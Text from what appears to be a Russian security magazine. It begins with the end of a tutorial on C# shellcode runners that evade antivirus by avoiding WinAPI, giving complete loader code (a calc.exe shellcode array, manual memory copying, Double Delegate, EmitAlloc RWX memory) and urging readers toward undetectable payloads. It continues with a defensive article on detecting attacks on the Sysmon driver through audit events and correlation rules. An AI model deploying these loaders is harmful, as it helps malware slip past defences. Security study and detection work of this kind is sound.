0xb7, 0x4a, 0x26, 0x31, 0xff,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d,
0x01, 0xc7, 0xe2, 0xf2, 0x52,
        0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11,
0x78, 0xe3, 0x48, 0x01, 0xd1,
        0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3,
0x3a, 0x49, 0x8b, 0x34, 0x8b,
        0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
0x38, 0xe0, 0x75, 0xf6, 0x03,
        0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58,
0x24, 0x01,0xd3, 0x66, 0x8b,
        0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b,
0x01,0xd0, 0x89, 0x44, 0x24,
        0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f,
0x5f, 0x5a,0x8b, 0x12, 0xeb,
        0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00,
0x50, 0x68, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56,0x68, 0xa6,
0x95, 0xbd, 0x9d, 0xff, 0xd5,
        0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
0x47, 0x13, 0x72,0x6f, 0x6a,
        0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65,
0x78, 0x65, 0x00
      };


      var size = x86shc.Length;
      var addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
      Marshal.Copy(x86shc, 0, addr, size);


      Thread thread = new Thread(() => {
        IntPtr functionPtr = addr;
        ExecuteShellcode(functionPtr);
      });


      thread.Start();
      thread.Join();
    }


    static void ExecuteShellcode(IntPtr funcAddr)
    {
      var func = Marshal.GetDelegateForFunctionPointer<FuncType>(
funcAddr);
      func();
    }


    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate void FuncType();
  }
}





                      Успешный запуск шелл‑кода

Прекрасно! Теперь пора избавляться от Marshal.Copy(). Конечно, это не
WinAPI, но я вошел во вкус и решил сделать абсолютно всю логику программы
на альтернативных функциях.


КОПИРУЕМ ПАМЯТЬ РУЧКАМИ

Какая логика работы функции Marshal.Copy()?


public static void Copy (float[] source, int startIndex, IntPtr
destination, int length);

Здесь все просто: идет копирование данных размером length из source,
начиная с индекса startIndex, по адресу destination.
   Что мешает нам написать это ручками? Тем более С# поддерживает
механизм указателей. Создадим метод CustomCopy(), принимающий все те
же аргументы, что и Marshal.Copy().


static void CustomCopy(byte[] source, int startIndex, IntPtr
destination, int length)
{
  unsafe
  {
    byte* destPtr = (byte*)destination.ToPointer();
    for (int i = startIndex; i < length; i++)
    {
      destPtr[i] = source[i];
    }
  }
}

Обрати внимание: здесь используется ключевое слово unsafe. Для успешной
компиляции проекта с таким ключевым словом следует в опциях сборки уста‐
новить галочку напротив пункта «Разрешить небезопасный код».





                            Необходимая опция

Метод  ToPointer()   преобразует  переданный  адрес    (destination)
в переменную destPtr, которая после выполнения метода начнет указывать
на тип byte. Затем по этому адресу будут копироваться значения из source.
Фактически мы побайтово копируем данные из source в destination.
  С изменениями код будет выглядеть так.


using System;
using System.Runtime.InteropServices;
using System.Threading;


namespace ConsoleApp1
{
  class Program
  {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling =
true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
uint flAllocationType, uint flProtect);



    static void Main(string[] args)
    {
      byte[] x86shc = new byte[193] {
        0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31,
0xc0, 0x64, 0x8b, 0x50, 0x30,
        0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f,
0xb7, 0x4a, 0x26, 0x31, 0xff,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d,
0x01, 0xc7, 0xe2, 0xf2, 0x52,
        0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11,
0x78, 0xe3, 0x48, 0x01, 0xd1,
        0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3,
0x3a, 0x49, 0x8b, 0x34, 0x8b,
        0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
0x38, 0xe0, 0x75, 0xf6, 0x03,
        0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58,
0x24, 0x01,0xd3, 0x66, 0x8b,
        0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b,
0x01,0xd0, 0x89, 0x44, 0x24,
        0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f,
0x5f, 0x5a,0x8b, 0x12, 0xeb,
        0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00,
0x50, 0x68, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56,0x68, 0xa6,
0x95, 0xbd, 0x9d, 0xff, 0xd5,
        0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
0x47, 0x13, 0x72,0x6f, 0x6a,
        0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65,
0x78, 0x65, 0x00
      };


      var size = x86shc.Length;
      var addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
      CustomCopy(x86shc, 0, addr, size);


      Thread thread = new Thread(() => {
        IntPtr functionPtr = addr;
        ExecuteShellcode(functionPtr);
      });


      thread.Start();
      thread.Join();
    }


    static void CustomCopy(byte[] source, int startIndex, IntPtr
destination, int length)
    {
      unsafe
      {
        byte* destPtr = (byte*)destination.ToPointer();
        for (int i = startIndex; i < length; i++)
        {
          destPtr[i] = source[i];
        }
      }
    }


    static void ExecuteShellcode(IntPtr funcAddr)
    {
      var func = Marshal.GetDelegateForFunctionPointer<FuncType>(
funcAddr);
      func();
    }


    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate void FuncType();
  }
}





                      Успешное выполнение кода

Остается   самое   сложное  —   выделять   исполняемую   память
без VirtualAlloc().


ВЫДЕЛЯЕМ ИСПОЛНЯЕМУЮ ПАМЯТЬ БЕЗ WINAPI

Делегаты
Ранее    мы     рассмотрели     способ     с    вызовом    метода
GetDelegateForFunctionPointer(), но  знаешь  ли  ты,  что  существует
и обратный метод? Имя его — GetFunctionPointerForDelegate(). Этот метод
позволяет получить адрес делегата в памяти. Догадываешься, что делать
дальше? Флоу простой:
 1. Создаем новый делегат.
 2. Делегат — функция. Функция — исполняемый код. Поэтому адрес делега‐
   та — исполняемая память.
 3. Получаем адрес делегата.
 4. Копируем по этому адресу шелл‑код.
 5. Получаем новый делегат по адресу.
 6. Передаем поток управления.
 7. Шелл‑код исполняется.

Это достаточно известный метод, и имя его — Double Delegate.


using System;
using System.Runtime.InteropServices;
namespace DelegateTest
{
  class Program
  {
    public delegate void Callback();
    public static void Action() {}


    delegate void CallingDelegate();


    static void Main()
    {
      var shellcode = new byte[] {0xfc,0x48,0x81,0xe4...}


      Callback myAction = new Callback(Action);


      IntPtr pMyAction = Marshal.GetFunctionPointerForDelegate(
myAction);


      Marshal.Copy(shellcode, 0, pMyAction, shellcode.Length);


      CallingDelegate callingDelegate = Marshal.
GetDelegateForFunctionPointer<CallingDelegate>(pMyAction);


      callingDelegate();
    }
  }
}

Однако есть еще один метод, который позволяет именно выделять память,
а не заимствовать чужую.


EmitAlloc()
Этот метод использует API System.Reflection.Emit для выделения про‐
извольного объема памяти. Он работает путем многократного вызова метода
EmitWriteLine(), который  перебирает  переданное  количество  байтов,
а затем вычитает по 18 байт из этого значения при каждой итерации цикла.
   Это значит, что при каждом вызове метода EmitWriteLine() выделяется
по 18 байт. После чего происходит вызов PrepareMethod(), который позволя‐
ет подготовить память, чтобы ее использовала CLR-платформа.
   Механизм был  обнаружен  исследователем Диланом  Траном.  Автор
любезно предоставил GitHub gists со всем необходимым кодом. Поэтому
переделать нашу программу под использование EmitAlloc() не составит
труда.


using System;
using System.Reflection.Emit;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;


namespace ConsoleApp1
{
  class Program
  {
    static void Main(string[] args)
    {
      byte[] x86shc = new byte[193] {
        0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31,
0xc0, 0x64, 0x8b, 0x50, 0x30,
        0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f,
0xb7, 0x4a, 0x26, 0x31, 0xff,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d,
0x01, 0xc7, 0xe2, 0xf2, 0x52,
        0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11,
0x78, 0xe3, 0x48, 0x01, 0xd1,
        0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3,
0x3a, 0x49, 0x8b, 0x34, 0x8b,
        0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
0x38, 0xe0, 0x75, 0xf6, 0x03,
        0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58,
0x24, 0x01,0xd3, 0x66, 0x8b,
        0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b,
0x01,0xd0, 0x89, 0x44, 0x24,
        0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f,
0x5f, 0x5a,0x8b, 0x12, 0xeb,
        0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00,
0x50, 0x68, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56,0x68, 0xa6,
0x95, 0xbd, 0x9d, 0xff, 0xd5,
        0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
0x47, 0x13, 0x72,0x6f, 0x6a,
        0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65,
0x78, 0x65, 0x00
      };


      var size = x86shc.Length;


      var addr = GenerateRWXMemory(size);


      CustomCopy(x86shc, 0, addr, size);


      Thread thread = new Thread(() => {
        IntPtr functionPtr = addr;
        ExecuteShellcode(functionPtr);
      });


      thread.Start();
      thread.Join();
    }


    static void CustomCopy(byte[] source, int startIndex, IntPtr
destination, int length)
    {
      unsafe
      {
        byte* destPtr = (byte*)destination.ToPointer();
        for (int i = startIndex; i < length; i++)
        {
          destPtr[i] = source[i];
        }
      }
    }


    public static IntPtr GenerateRWXMemory(int ByteCount)
    {
      AssemblyName AssemblyName = new AssemblyName("Assembly");
      AssemblyBuilder AssemblyBuilder = AppDomain.CurrentDomain.
DefineDynamicAssembly(AssemblyName, AssemblyBuilderAccess.Run);
      ModuleBuilder ModuleBuilder = AssemblyBuilder.
DefineDynamicModule("Module");
      MethodBuilder MethodBuilder = ModuleBuilder.DefineGlobalMethod(
        "MethodName",
        MethodAttributes.Public | MethodAttributes.Static,
        typeof(void), //arbitrary return type hehexd
        new Type[] { }); // no args, but no real reason


      ILGenerator il = MethodBuilder.GetILGenerator();
      // sub rsp,28h                  (0x48, 0x83, 0xec, 0x28) [4]
      // Every Emit.WriteLine results in 18 bytes
      // mov rcx,1D3E2F736A8h             (0xe8, 0x7a, 0x07, 0x45,
0x5e) [5]
      // rcx,qword ptr [rcx]              (0x48, 0x8b, 0x09) [3]
      // call  mscorlib_ni!System.Console.WriteLine (0x48, 0xb9,
0xa8, 0x36, 0xf7, 0xe2, 0x2d, 0x30, 0x10, 0x00) [10]
      // Ends with
      // ret (0xc3) [1]
      while (ByteCount > 0)
      {
        il.EmitWriteLine("bruh");
        ByteCount -= 18;
      }
      il.Emit(OpCodes.Ret);      // JIT to 0xc3
      ModuleBuilder.CreateGlobalFunctions();


      RuntimeMethodHandle mh = ModuleBuilder.GetMethods()[0].
MethodHandle;
      RuntimeHelpers.PrepareMethod(mh);
      return mh.GetFunctionPointer();
    }


    static void ExecuteShellcode(IntPtr funcAddr)
    {
      var func = Marshal.GetDelegateForFunctionPointer<FuncType>(
funcAddr);
      func();
    }


    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate void FuncType();
  }
}

Подробный анализ такого метода выделения памяти можно почитать в блоге
Петара Праника.


ВЫВОДЫ

У нас получилось успешно избавиться от использования методов WinAPI, что
позволяет сделать шелл‑код‑раннер более скрытным. Помни: если ты хочешь
предотвратить обнаружение твоей нагрузки антивирусом, то нужно мыслить
шире и делать не так, как все. Как только ты начинаешь отходить от известных
способов обхода антивируса, сразу же начинаешь получать нагрузки, близ‐
кие к FUD.
АДМИН





Пентестерам часто приходится иметь дело
со средствами мониторинга, которые необ‐
ходимо обойти раньше, чем безопасники
поднимут тревогу. В этой статье я расскажу,
что может сделать команда обнаружения              driverenok                                                                                                       Threat Researcher
и реагирования, чтобы не проморгать атаку        andreykras14@gmail.com
и вовремя заметить, что с мониторингом
кто‑то химичит.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Как известно, в недрах средств мониторинга для Windows лежат два основных
механизма, которые  позволяют им  функционировать:  подсистема  Event
Tracing for Windows и ядерная поддержка, реализованная в виде драйверов.
  В предыдущих материалах мы с тобой подробно разбирали принципы
работы этих механизмов, а также вредоносных техник, реализация которых
позволяла атакующим ослепить мониторинг. В этой же статье мы поговорим
о том, как эти техники можно детектить с помощью встроенных в ОС Windows
механизмов, и в качестве бонуса напишем ряд корреляций.


Читай также

 • Ослепить Sysmon. Выводим мониторинг из строя максимально незаметно
 • Ослепить Sysmon полностью. Манипулируем объектами ETW, чтобы обой‐
   ти мониторинг
 • Добиваем мониторинг. Как работают продвинутые атаки на Sysmon




ДЕТЕКТИМ АТАКИ НА ДРАЙВЕР

Обнаруживаем манипуляции с Security Descriptor
Будем считать, что первая связка техник, которую удалось поэксплуатировать
нашим пентестерам, — манипуляция дескриптором безопасности объекта,
плавно переходящая в манипуляцию хендлом. Вкратце напомню, как это про‐
исходило.
 1. Основная часть событий, которую Sysmon пишет в свой журнал, поступает
   от драйвера SysmonDrv. Для этого сам драйвер создает коммуникацион‐
   ное устройство \\Device\SysmonDrv. Это объект ядра, а у объекта ядра
   есть дескриптор безопасности  (security  descriptor, SD), который явно
   определяет, кому можно получить доступ к этому устройству, а кому нет.
 2. Атакующий меняет этот  дескриптор таким образом,  чтобы  процессу
  Sysmon64.exe, работающему от имени учетной записи Local System,
  было отказано в предоставлении доступа к устройству.
 3. Однако на момент манипуляций с SD у процесса Sysmon64.exe уже есть
   открытый хендл устройства с правами чтения, который необходимо обно‐
   вить.
 4. Для   этого  он   делает   вызов   DuplicateHandle   с   параметром
  DUPLICATE_CLOSE_SOURCE и таким образом копирует хендл объекта \\
  Device\SysmonDrv из процесса Sysmon64.exe в собственный вре‐
   доносный процесс с последующим закрытием хендла‑источника, зас‐
   тавляя тем самым Sysmon64.exe повторно запросить хендл коммуника‐
   ционного устройства.

Давай на это посмотрим с позиции детекта. Первым делом вредоносный
процесс вызывает CreateFile() (с параметром WRITE_DAC), чтобы получить
хендл   объекта   \\.\SysmonDrv.   После    этого   дергает   функцию
SetSecurityInfo(), которая устанавливает новый список DACL. В этот момент
должно быть сгенерировано два события: EventID 4656 — запрос хендла
объекта и EventID 4663 — попытка выполнения операции с объектом (при
условии, что настроен аудит объектов ядра).





Можно было бы  детектить такую активность на  основе перечисленных
событий.  Однако  у   этого  подхода  есть  существенный  недостаток:
события 4656 и 4663 генерируются слишком часто. Поэтому мы пойдем дру‐
гим путем.
   Подсистема  безопасности  Windows  может  генерировать  события,
которые прямо свидетельствуют об изменении списка DACL (но тут тоже есть
несколько подводных камней, о которых я расскажу дальше). Давай сначала
посмотрим на это событие, а потом поговорим о том, как же его заполучить.
Итак, меняем список DACL.





Открываем журнал Security и видим следующее.





Событие EventID 4670 говорит нам о  том,  что  вредоносный  процесс,
запущенный  от  имени  админа,  изменил DACL для  объекта \\Device\
SysmonDrv. Причем отображаются как старые, так и новые разрешения
для объекта. Отлично, напишем условие формирования алерта на языке
eXtraction and Processing:


event SysmonDrv_DaclModified:
    key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and
        event_src.title == "windows" and
        msgid == "4670" and
        lower(object.type) == "file" and
        lower(object.name) == "sysmondrv"
    }


rule SysmonDrv_device_dacl_manipulation: SysmonDrv_DaclModified

Полный текст правила (с вариациями детекта на основе EventID  4656
и EventID 4663) можно посмотреть в репозитории Open XP Rules.
  Для Elastic SIEM детект имеет следующий вид.





Казалось бы, мы нашли событие, которое описывает факт воздействия
на Sysmon, но нет! И сейчас я постараюсь объяснить почему.
   Во‑первых, чтобы получить это событие, мне пришлось включить аудит
объектов  ядра  и  в  качестве  бонуса  получить  нескончаемый  поток
событий 4656, 4658 и 4663, в которых можно просто утонуть. Хотя в офи‐
циальной документации Microsoft говорится, что для 4670 достаточно вклю‐
чить только аудит изменения политики авторизации.
   Во‑вторых, чтобы события все‑таки начали формироваться, нужно настро‐
ить SACL для этого объекта \\.\SysmonDrv. В исходном состоянии он имеет
следующий вид.



Эта запись означает, что параметры аудита для данного объекта наследуются
от его родителя. Точнее, что по умолчанию никаких событий аудита сгенери‐
ровано не будет.
   Давай его немного изменим:


S:(AU;SAFA;FA;;;WD)

Эта строка означает, что для всех учетных записей (WD — Everyone) нужно
формировать события аудита (AU) независимо от результата операции дос‐
тупа  (SA — SuccessfulAccess, FA — FailedAccess). Реализовать настройку
SACL можно, например, так:


#include <windows.h>
#include <sddl.h>
#include <aclapi.h>
#include <stdio.h>


int main(int argc, char** argv)
{
    LPWSTR stringSacl = L"S:(AU; SAFA; FA;;; WD)";


    LPWSTR lpDeviceName = L"\\\\.\\SysmonDrv";
    PSECURITY_DESCRIPTOR pSecurityDescriptor = NULL;
    PACL pSacl = NULL;
    BOOL bSaclPresent = FALSE, bSaclDefaulted = FALSE;


    /*      check SeSecurityPrivilege               */


    /*      enable SeSecurityPrivilege              */


    HANDLE hDevice = CreateFile(lpDeviceName, ACCESS_SYSTEM_SECURITY,
0, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);


    if (hDevice == INVALID_HANDLE_VALUE)
    {
        wprintf(L"[-] CreateFile func with ACCESS_SYSTEM_SECURITY
flag return error: %d\n", GetLastError());
        goto Cleanup;
    }


    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
stringSacl, SDDL_REVISION_1, &pSecurityDescriptor, NULL))
    {
        wprintf(L"[-]
ConvertStringSecurityDescriptorToSecurityDescriptorW func return
error: %d\n", GetLastError());
        goto Cleanup;
    }


    if (!GetSecurityDescriptorSacl(pSecurityDescriptor, &bSaclPresent
, &pSacl, &bSaclDefaulted))
    {
        wprintf(L"[-] GetSecurityDescriptorSacl func return error: %d
\n", GetLastError());
        goto Cleanup;
    }


    if (!IsValidAcl(pSacl))
    {
        wprintf(L"[-] SACL not valid\n");
        goto Cleanup;
    }


    if (SetSecurityInfo(hDevice, SE_KERNEL_OBJECT,
SACL_SECURITY_INFORMATION, NULL, NULL, NULL, pSacl) != ERROR_SUCCESS)
    {
        wprintf(L"[-] SetSecurityInfo func return error: %d\n",
GetLastError());
        goto Cleanup;
    }


Cleanup:
    if (pSecurityDescriptor)
        LocalFree(pSecurityDescriptor);
    if (pSacl)
        VirtualFree(pSacl, 0, MEM_RELEASE);
    if (hDevice)
        CloseHandle(hDevice);


    return 0;


}

Не забудь в приведенный выше код добавить возможность включения при‐
вилегии    SeSecurityPrivilege,    в     противном     случае    будет
ERROR_ACCESS_DENIED (о том, как управлять привилегиями, читай в статье
«Privileger. Управляем привилегиями в Windows»).
  Но согласись, как‑то все довольно тяжело для того, чтобы просто замони‐
торить операции с девайсом. Давай посмотрим, может, есть еще какие‑то
способы обнаружить эту активность? Да, они есть!
  В  подсистеме  аудита Windows есть событие, которое поможет нам
заподозрить, что с Sysmon что‑то не то, — EventID 4674. С его помощью мож‐
но отследить вызовы функций, которые требуют чувствительных привилегий.
Как говорится в документации, к чувствительным привилегиям относятся:
 • SeAssignPrimaryTokenPrivilege;
 • SeAuditPrivilege:
 • SeBackupPrivilege:
 • SeCreateTokenPrivilege;
 • SeDebugPrivilege;
 • SeImpersonatePrivilege:
 • SeLoadDriverPrivilege;
 • SeLockMemoryPrivilege;
 • SeRestorePrivilege;
 • SeSecurityPrivilege;
 • SeSystemEnvironmentPrivilege;
 • SeTakeOwnershipPrivilege.

Что  это  значит?  Для  изменения  дескриптора  безопасности  девайса
SysmonDrv    используется   вызов    SetSecurityInfo()   с   параметром
DACL_SECURITY_INFORMATION.  Изменение  списка DACL  само  по  себе
не является привилегированной операцией, но тут  стоит учитывать, что
для его реализации необходимо:
 • либо иметь соответствующие разрешения в действующем списке DACL;
 • либо быть хозяином объекта.

Если скомпрометированная учетка (от имени которой запущен вредоносный
код) не имеет явного разрешения на изменение DACL, то тут атакующий сна‐
чала сделает себя хозяином объекта и только после этого будет менять
DACL. Процесс получения прав хозяина объекта — чувствительная операция,
которая     требует     наличия     привилегий    SeRestorePrivilege
и SeTakeOwnershipPrivilege, а сам факт использования привилегирован‐
ной операции приводит к формированию EventID 4674.





Это событие будет сформировано в момент вызова SetSecurityInfo(). Оно
нам говорит, что доступ осуществляется к объекту \\Device\SysmonDrv, опе‐
рация доступа — WRITE_OWNER, а для выполнения этой операции используют‐
ся привилегии SeRestorePrivilege и SeTakeOwnershipPrivilege. Совокуп‐
ность этих фактов говорит об изменении хозяина объекта.
  На основе этой информации можно получить детект:


event SysmonDrv_OwnerModified:
    key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and
        event_src.title == "windows" and
        msgid == "4674" and
        lower(object.path) == "\\device\" and
        lower(object.name) == "sysmondrv" and
        lower(object.property) == "privilege list" and
        regex(lower(object.value),"setakeownershipprivilege", 0) !=
null
    }


rule SysmonDrv_device_owner_manipulation: SysmonDrv_OwnerModified

Корреляция для Elastic SIEM будет выглядеть следующим образом.





Конечно же, никто не гарантирует, что вредонос будет выполнять указанные
действия перед изменением DACL, но вероятность этого довольно высока.
Кроме того, частота генерации этих событий (4674) низкая, поэтому рекомен‐
дую в боевой инфре настроить аудит «Использование прав, затрагивающих
конфиденциальные данные» и попросить Windows Event Collector собирать
эти события.
   Что   касается  дальнейших   действий,  то   тут   происходит  вызов
OpenProcess()   (с   маской   PROCESS_DUP_HANDLE)   и   последующий
DuplicateHandle() с параметром DUPLICATE_CLOSE_SOURCE, чтобы закрыть
описатель на \\Device\SysmonDrv.
   Можем привести параметры аудита процесса Sysmon к такому виду:


S:(AU;SAFA;FA;;;WD)

Тогда мы получим события 4656 и 4663.





                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ

     ДЕТЕКТ НА СВЯЗИ
        УЧИМСЯ ОБНАРУЖИВАТЬ СЛЕДЫ
                           АТАК НА EDR





Также может быть сгенерировано событие EventID 4690, которое должно
сообщить нам о дублировании хендла, но оно не предоставляет информации
о    параметрах    дублирования      (DUPLICATE_CLOSE_SOURCE),    равно
как и 4656 и 4663, а также имеет высокую частоту генерации.
   Кроме того, их получение — задача не такая уж тривиальная, потому что
придется править SACL для процесса. А это снова писать код и производить
прочие манипуляции (если ты знаешь, как можно изменить SACL на процессы
штатными инструментами, прошу меня поправить).
  В завершение этого раздела давай посмотрим на событие EventID 255,
которое сформировал сам Sysmon.
   Из‑за того что Sysmon больше не может получить хендл коммуникацион‐
ного устройства, он сообщит нам об этом.





А мы, в свою очередь, напишем детект:


event SysmonDrv_InvalidHandle:
    key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and
        event_src.title == "sysmon" and
        msgid == "255" and
        lower(object.name) == "drivercommunication" and
        regex(lower(reason), "access.*driver.*(неверный|invalid)|(
дескриптор|handle)", 0) != null
    }


rule SysmonDrv_device_dacl_manipulation: SysmonDrv_InvalidHandle





                            Правила для Elastic


Детектим подмену хендла девайса SysmonDrv
В статье «Продвинутые атаки на мониторинг» я показывал технику, которая
отличается от описанной выше тем, что изменяется состояние процесса
(suspend →  resume).  Это  можно  было бы  отлавливать  с помощью
события 4663, но трудности настройки аудита (доступа к рядовым процес‐
сам) наталкивают на мысль оставить это дело. Поэтому мы посмотрим на еще
одну разновидность события Sysmon 255. Оно появляется в результате про‐
ведения техники, которую ты можешь наблюдать на скриншоте ниже.





В этом случае мы видим множество событий 255. Напишем детект:


event SysmonDrv_InvalidParam:
    key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and
        event_src.title == "sysmon" and
        msgid == "255" and
        lower(object.name) == "drivercommunication" and
        regex(lower(reason), "failed.*retrieve.*events(
неверно|invalid)|(параметр|parameter)", 0) != null
    }


rule SysmonDrv_handle_hijacking: SysmonDrv_InvalidParam+ ->
SysmonDrv_InvalidParam

И правило для Elastic SIEM.





Детектим фейковый DosDevice
В статье «Добиваем мониторинг» я подробно рассказывал, как атакующие
могут подменять символические ссылки на объекты. Суть этой техники зак‐
лючается в создании фейковой ссылки SysmonDrv на коммуникационное
устройство раньше, чем запустится служба Sysmon64. Давай кратко вспом‐
ним алгоритм работы этой техники:
 1. Вредоносный процесс с помощью вызова CreateService() регистрирует
   себя в качестве службы, чтобы быть запущенным во время старта опе‐
   рационной системы.
 2. С помощью функции RegSetValueEx прописывает себя в список зависи‐
   мостей сервиса Sysmon64.
 3. Это позволяет ему запуститься до старта Sysmon и с помощью вызова
   DefineDosDevice() подменить целевое устройство, на которое указывает
   символическая ссылка SysmonDrv.

Во всей этой цепочке самыми подозрительными будут факты создания
службы и появления зависимости у Sysmon. Создание служб можно
мониторить с помощью событий 4697 или 7045. А добавление зависимости
службе Sysmon равносильно изменению значения ключа DependOnService
вот в этой ветке:


HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sysmon64

Сам по себе Sysmon не имеет никаких зависимостей, и, если они появляются,
значит, перед нами какая‑то аномалия.
   Давай попробуем посмотреть на это. Первым делом нам потребуется нас‐
троить список SACL для ветки реестра, описывающей параметры работы
Sysmon.





Настраиваем список аудита для всех пользователей при выполнении опе‐
рации «Задание значения ключа», область действия — «Этот раздел и его
подразделы». Список разграничения доступа лучше сделать пустым, чтобы
не возникло коллизий с существующими разрешениями.
   Итак,  эксплуатируем  технику и смотрим в  журнал. Первое событие,
которое мы видим, — EventID 4697, событие создания службы. Оно будет
сформировано при  условии,  что  включен  аудит  расширения  системы
безопасности.





В этом событии есть имя службы и путь к исполняемому файлу. Однако нет
смысла завязываться на эти параметры, поскольку они могут быть любыми.
Аналогично по информативности событие 7045 (но в журнале System).
   Сразу же после события создания службы будет сформирован еще один
интересный EventID — 4657, который говорит нам об изменении значения
ключа реестра (при условии, что включен аудит реестра и к соответствующим
веткам применен SACL).





Также можно рассчитывать на событие самого Sysmon — 13, ведь эффект
такой техники будет виден только при следующем старте системы.
  И эти события куда более интересны, чем события установки служб. Здесь
четко видно, что для параметра DependOnService ветки \REGISTRY\MACHINE\
SYSTEM\ControlSet001\Services\Sysmon64  установлено  значение  E:\
work\myproject\proch\x64\Debug\FakeDosDevice.exe,  что  равнозначно
добавлению зависимости для службы Sysmon64.
   Детект будет выглядеть следующим образом:


event MalwareService_Created:
    key:
        event_src.host, subject.account.session_id
    filter {
        filter::NotFromCorrelator() and
        event_src.title == "windows" and
        in_list(["4697", "7045"], msgid)
    }


event SysmonDepend_Created:
    key:
        event_src.host, subject.account.session_id
    filter {
        filter::NotFromCorrelator() and ((
            event_src.title == "windows" and
            msgid == "4657"
        ) or (
            event_src.title == "sysmon" and
            msgid == "13" )
        ) and
        in_list(["create", "modify"], lower(action)) == True and
        regex(object.path, "sysmon64", 0) != null and
        lower(object.name) == "dependonservice"
    }


rule Create_fake_SysmonDrv_symlink: MalwareService_Created* ->
SysmonDepend_Created within 20s

И по традиции скрин из Kibana.





А вот что произойдет в журнале Sysmon после перезагрузки.





В событиях мы увидим два характерных события — EventID 255. Дополним
нашу детектирующую логику:


event MalwareService_Created:
    key:
        event_src.host, subject.account.session_id
    filter {
        filter::NotFromCorrelator() and
        event_src.title == "windows" and
        in_list(["4697", "7045"], msgid)
    }


event SysmonDepend_Created:
    key:
        event_src.host, subject.account.session_id
    filter {
        filter::NotFromCorrelator() and ((
            event_src.title == "windows" and
            msgid == "4657"
        ) or (
